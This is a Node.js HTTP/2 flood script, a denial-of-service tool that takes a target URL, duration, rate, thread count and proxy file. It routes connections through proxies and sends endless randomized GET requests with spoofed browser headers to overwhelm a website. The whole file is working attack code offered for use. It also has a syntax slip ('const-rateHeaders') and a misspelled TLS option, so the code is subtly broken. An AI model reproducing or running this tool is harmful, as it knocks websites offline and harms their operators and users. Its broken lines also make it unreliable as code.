const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384"
].join(':');

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];
const lang_header = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-CA', 'en-NZ', 'en-ZA', 'fr-FR', 'de-DE', 'es-ES', 'it-IT'
];
const encoding_header = [
    'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch', 'br'
];
const version = [
    '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    '"Google Chrome";v="116", "Not;A=Brand";v="8", "Chromium";v="116"',
    '"Chromium";v="115", "Not.A/Brand";v="8", "Google Chrome";v="115"',
];
const-rateHeaders = [{
    "akamai-origin-hop": randstr(12)
}, {
    "proxy-client-ip": randstr(12)
}, {
    "via": randstr(12)
}, {
    "cluster-ip": randstr(12)
}, {
    "user-agent": randstr(12)
}, ];

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Streams per Connection: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');

    setTimeout(() => {
        console.log('Attack finished.');
        process.exit(0);
    }, args.time * 1000);

} else {
    const CONCURRENT_CONNECTIONS = 8;
    for (let i = 0; i < CONCURRENT_CONNECTIONS; i++) {
        startFlooder();
    }
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function startFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            startFlooder();
            return;
        }

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: randomElement(sig),
            ciphers: ciphers,
            ecdhCurve: 'auto',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_NO_QUERY_MTU |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, { ...tlsOptions,
            socket: connection
        });

        tlsConn.on('error', (err) => {
            tlsConn.destroy();
        });

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            createConnection: () => tlsConn,
        });

        client.on("connect", () => {
            for (let i = 0; i < args.Rate; i++) {
                sendContinuousRequest(client);
            }
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            startFlooder();
        });

        client.on("error", (error) => {
            client.destroy();
            connection.destroy();
        });
    });
}

function sendContinuousRequest(client) {
    if (client.destroyed) {
        return;
    }
    
    let dynHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
        "sec-ch-ua": randomElement(version),
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-mobile": "?0",
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(lang_header),
        "upgrade-insecure-requests": "1",
        "accept": randomElement(accept_header),
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "x-requested-with": "XMLHttpRequest",
        ...randomElement(rateHeaders)
    };

    const request = client.request(dynHeaders);

    request.on("response", () => {
        request.close();
    });
    
    request.on("error", (err) => {
        request.close();
    });

    request.end();

    setImmediate(() => {
        sendContinuousRequest(client);
    });
}

setTimeout(() => {
    process.exit(1)
}, args.time * 1000);
